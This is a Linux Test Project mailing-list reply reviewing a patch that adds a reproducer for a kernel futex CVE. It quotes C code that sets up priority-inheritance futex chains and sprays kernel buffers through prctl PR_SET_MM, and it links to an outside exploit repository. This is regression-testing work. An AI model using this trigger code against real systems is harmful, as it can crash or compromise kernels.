Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 32CFCC5DF69
	for <ltp@archiver.kernel.org>; Thu, 13 Aug 2026 13:37:26 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 377AE3E6C05
	for <ltp@archiver.kernel.org>; Thu, 13 Aug 2026 15:37:24 +0200 (CEST)
Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::5])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id A7B483E249C
 for <ltp@lists.linux.it>; Thu, 13 Aug 2026 15:37:07 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-5.smtp.seeweb.it (Postfix) with ESMTPS id 22F586005F2
 for <ltp@lists.linux.it>; Thu, 13 Aug 2026 15:37:06 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id 124B982924;
 Thu, 13 Aug 2026 13:37:05 +0000 (UTC)
Authentication-Results: smtp-out1.suse.de;
	none
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 7BE5D77E42;
 Thu, 13 Aug 2026 13:37:04 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id oB2SGoDIfWptEgAAD6G6ig
 (envelope-from <pvorel@suse.cz>); Thu, 13 Aug 2026 13:37:04 +0000
Date: Thu, 13 Aug 2026 15:37:02 +0200
From: Petr Vorel <pvorel@suse.cz>
To: Andrea Cervesato <andrea.cervesato@suse.com>
Message-ID: <20260813133702.GB1879570@pevik>
References: <20260813121355.GE1843300@pevik>
 <6a7dbb91.9099b29d.af1f2.8590@mx.google.com>
MIME-Version: 1.0
Content-Disposition: inline
In-Reply-To: <6a7dbb91.9099b29d.af1f2.8590@mx.google.com>
X-Rspamd-Pre-Result: action=no action; module=replies;
 Message is reply to one we originated
X-Spamd-Result: default: False [-4.00 / 50.00];
	REPLY(-4.00)[]
X-Rspamd-Queue-Id: 124B982924
X-Rspamd-Pre-Result: action=no action; module=replies;
 Message is reply to one we originated
X-Rspamd-Server: rspamd2.dmz-prg2.suse.org
X-Rspamd-Action: no action
X-Virus-Scanned: clamav-milter 1.0.9 at in-5.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH v3 2/2] cve: add CVE-2026-43499 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Reply-To: Petr Vorel <pvorel@suse.cz>
Cc: Linux Test Project <ltp@lists.linux.it>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi Andrea,

> Hi Petr,

> > tst_test.c:2047: TINFO: LTP version: 20260529-202-ga91c5b6036
> > tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc6-3.g1b28f10-default #1 SMP PREEMPT_DYNAMIC Thu Aug  6 23:49:19 UTC 2026 (1b28f10) x86_64
> > tst_kconfig.c:90: TINFO: Parsing kernel config '/proc/config.gz'
> > tst_kconfig.c:756: TINFO: CONFIG_FAULT_INJECTION kernel option detected which might slow the execution
> > tst_test.c:1875: TINFO: Overall timeout per run is 0h 05m 00s
> > ghostlock.c:191: TINFO: Triggering PI deadlock and stack spray
> > Test timeouted, sending SIGKILL!
> > tst_test.c:1947: TINFO: If you are running on slow machine, try exporting LTP_TIMEOUT_MUL > 1
> > tst_test.c:1949: TBROK: Test killed! (timeout?)

> did you try with LTP_TIMEOUT_MUL > 1? It's possible that CVE is simply
> not triggered.

Trying nowi with LTP_TIMEOUT_MUL=2 and even this did not help. But this is
normal VM => more people will get TBROK (false positive). IMHO test should use
tst_remaining_runtime()) and quit earlier itself. And maybe the default runtime
should be higher.

> > > +static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
> > > +				 struct timespec *ts)
> > > +{
> > > +	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
> > > +			   uaddr2, 0);
> > > +}
> > > +
> > > +static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
> > > +{
> > > +	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
> > > +			   uaddr2, 0);
> > > +}
> > > +
> > > +static int futex_lock_pi(uint32_t *uaddr)
> > > +{
> > > +	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
> > > +}
> > > +
> > > +static int futex_unlock_pi(uint32_t *uaddr)
> > > +{
> > > +	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
> > > +}
> > nit: we already have sys_futex() in include/tst_timer.h, maybe using it?

> isn't it exactly the same?

Exactly, that's why would personally use already defined function. But ok, these
names are kind of documentation of the usage, feel free to ignore it.

> > > +
> > > +static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
> > > +{
> > > +	struct timespec ts;
> > > +	struct prctl_mm_map mm_map = {
> > > +		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
> > > +		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
> > > +		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
> > > +		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
> > > +		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
> > > +		.brk         = (uint64_t)(uintptr_t)sbrk(0),
> > > +		.start_stack = (uint64_t)(uintptr_t)&mm_map,
> > > +		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
> > > +		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
> > > +		.env_start   = (uint64_t)(uintptr_t)&mm_map,
> > > +		.env_end     = (uint64_t)(uintptr_t)&mm_map,
> > > +		.auxv        = (void *)auxv,
> > > +		.auxv_size   = valid_auxv_size,
> > > +		.exe_fd      = (uint32_t)-1,
> > > +	};

> > nice magic :).

I tried to read code in
https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499/exploit/src
and now I understand why you used Kimi K3 for analysis :).

> > > +
> > > +	waiter_tid = tst_syscall(__NR_gettid);
> > > +
> > > +	futex_lock_pi(&f_pi_chain);
> > > +
> > > +	TST_CHECKPOINT_WAKE2(CP_CHAIN_HELD, 2);
> > > +	TST_CHECKPOINT_WAIT(CP_OWNER_BLOCKED);
> > > +
> > > +	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
> > > +	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
> > > +	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
> > > +
> > > +	TST_CHECKPOINT_WAKE(CP_SPRAYED);
> > > +
> > > +	while (!tst_atomic_load(&stop_spray)) {
> > > +		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
> > > +		      sizeof(mm_map), 0);

> > Maybe SAFE_PRCTL() ?

> I also thought about it, but that's the syscall that poison the buffer
> and we don't care if it fails. Actually, if it fails during SAFE_PRCTL(),
> the test will break and we can't reproduce the bug, so it's ok to leave
> it raw.

Maybe worth to note that in the comment so that it stays the same in the future?

> > > +	}
> > > +
> > > +	TST_CHECKPOINT_WAIT(CP_SETATTR_DONE);
> > > +
> > > +	futex_unlock_pi(&f_pi_chain);
> > > +
> > > +	return NULL;
> > > +}
> > > +
> > > +static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
> > > +{
> > > +	owner_tid = tst_syscall(__NR_gettid);
> > > +
> > > +	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
> > > +
> > > +	futex_lock_pi(&f_pi_target);
> > > +	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
> > > +
> > > +	futex_lock_pi(&f_pi_chain);
> > > +
> > > +	futex_unlock_pi(&f_pi_chain);
> > > +	futex_unlock_pi(&f_pi_target);
> > > +
> > > +	return NULL;
> > > +}
> > > +
> > > +static void setup(void)
> > > +{
> > > +	static const int try_sizes[] = {
> > very nit: why static?

> I can even move it wit hthe other static variables.

Yeah.

> > > +		MAX_AUXV_WORDS,
> > > +		MAX_AUXV_WORDS - 4,
> > > +		MAX_AUXV_WORDS - 8
> > I wonder why these other 2?

> according to the kernel version, we might have different words sizes.
> Especially for older kernels, MAX_AUXV_WORDS is rejected and we might
> need a smaller value.

Thanks for an explanation.

Anyway, the only important thing is IMHO to handle timeout.

Kind regards,
Petr

> > Code LGTM, but I'd like to have at least brief look at the original reproducers.

> > Kind regards,
> > Petr

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
